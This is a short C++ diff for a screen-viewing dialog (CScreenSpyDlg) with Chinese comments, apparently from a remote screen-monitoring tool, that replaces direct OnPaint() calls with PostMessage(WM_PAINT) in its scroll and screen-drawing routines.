@@ -276,7 +276,7 @@ void CScreenSpyDlg::OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
 
 	SetScrollPos(SB_HORZ, m_HScrollPos);
 
-	OnPaint();
+	PostMessage(WM_PAINT);
 	CDialog::OnHScroll(nSBCode, nPos, pScrollBar);
 }
 
@@ -378,7 +378,8 @@ void CScreenSpyDlg::DrawFirstScreen(void)
 	//这里也很简单就是得到服务端发来的数据 ，将他拷贝到HBITMAP的缓冲区中，这样一个图像就出现了
 	memcpy(m_lpScreenDIB, m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_lpbmi->bmiHeader.biSizeImage);
 	//我们到OnPaint()函数
-	OnPaint();
+	//OnPaint();
+	PostMessage(WM_PAINT);
 }
 
 
@@ -434,7 +435,7 @@ void CScreenSpyDlg::DrawNextScreenDiff(void)
 			jnz CopyNextBlock
 	}
 
-	if (bIsReDraw) OnPaint();
+	if (bIsReDraw) PostMessage(WM_PAINT);
 }
 
 
@@ -511,7 +512,7 @@ void CScreenSpyDlg::DrawNextScreenRect(void)
 		dwOffset += sizeof(RECT) + m_lpbmi_rect->bmiHeader.biSizeImage;
 	}
 
-	if (bIsReDraw) OnPaint();
+	if (bIsReDraw) PostMessage(WM_PAINT);
 }
 
 //更改屏幕分辨率
